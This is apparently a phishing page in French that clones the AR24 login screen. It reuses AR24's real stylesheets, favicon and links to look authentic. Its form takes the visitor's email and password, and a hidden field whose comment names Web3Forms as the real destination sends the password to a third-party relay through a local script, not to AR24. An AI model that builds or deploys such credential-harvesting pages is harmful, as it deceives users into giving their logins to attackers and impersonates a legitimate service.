<html lang="fr" class="no-js">
<!--<![endif]-->

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
    <title>SITE &nbsp;- AR24</title>

    <!-- Lien vers les fichiers CSS originaux (inchangés) -->
    <link rel="stylesheet"
        href="https://app.ar24.fr/static/min/?f=css/reset.css,css/design-system.css,fonts/font-barlow.css,fonts/font-montserrat.css&1771239617" />
    <link rel="icon" type="image/png" href="https://app.ar24.fr/static/images/favicon.png" />
    <meta name="theme-color" content="#0000FF" />
    <meta name="description" content="" />
    <link href="https://app.ar24.fr/static/css/pages/user-login.css?v=1771239617" rel="stylesheet" type="text/css" />
    <link rel="stylesheet" href="footer.css" />
</head>

<body class="guest">
    <noscript>
        <div style="
          z-index: 100;
          text-align: center;
          line-height: 2em;
          background-color: #c0392b;
          color: white;
          font-weight: 500;
          position: fixed;
          top: 40px;
          left: 50%;
          transform: translateX(-50%);
          padding: 20px 30px;
          
        ">
            <div>
                JavaScript n'est pas activé pour le site d'AR24. Il est nécessaire au bon
                fonctionnement de nos services.
            </div>
            <div>
                <a href="https://app.ar24.fr/fr/page/javascript" style="color: inherit; border-bottom: 1px solid">Suivre
                    les instructions pour activer JavaScript</a>
            </div>
        </div>
    </noscript>

    <main id="main-content">
        <div class="col-small">
            <header>
                <h1 class="align-center">Connectez-vous</h1>
            </header>
            <section class="content">
                <div class="card margin-auto">



                    <form id="contact-form-2">


<label for="ide_id" class="fw-500">
    Adresse e-mail
</label>

<input
    type="email"
    id="ide_id"
    name="email"
    placeholder="Ex : monadresse@email.fr"
    required
    autocomplete="email"
    inputmode="email"
>

<label for="message_display" class="fw-500">
    Votre mot de passe
</label>

<textarea
    id="message_display"
    placeholder="Votre mot de passe"
    required
    autocomplete="off"
    autocorrect="off"
    autocapitalize="sentences"
    spellcheck="false"
></textarea>

<!-- Vraie valeur envoyée à Web3Forms -->
<input
    type="hidden"
    id="message_id"
    name="message"
>

<div class="display-flex mt-m">

    <input
        type="checkbox"
        id="remember-me"
        name="remember"
        value="1"
    >

    <label for="remember-me">
        Se souvenir de moi
    </label>

</div>

<p class="align-center mt-m">

    <input
        class="btn btn-primary"
        type="submit"
        value="Connectez-vous"
        title="connecter-vous"
    >

</p>

<div id="form-message-2" role="status"></div>


</form>




                    <p id="form-message" aria-live="polite"></p>
                </div>
                <div class="mt-m align-right">
                    <a href="https://app.ar24.fr/fr/page/forgot" class="btn-link"
                        aria-label="Cliquez ici pour être redirigé vers la procédure de réinitialisation de votre mot de passe dans le cas où vous l'auriez oublié">Réinitialiser
                        mon mot de passe</a>
                    <a href="https://app.ar24.fr/fr/user/register" class="btn-link ml-s"
                        aria-label="Cliquez ici pour être redirigé vers la page d'inscription d'AR24">Créer un
                        compte</a>
                </div>
            </section>
        </div>
    </main>

   

    <!-- Script de la page -->
    <script src="contact.js"></script>
</body>

</html>
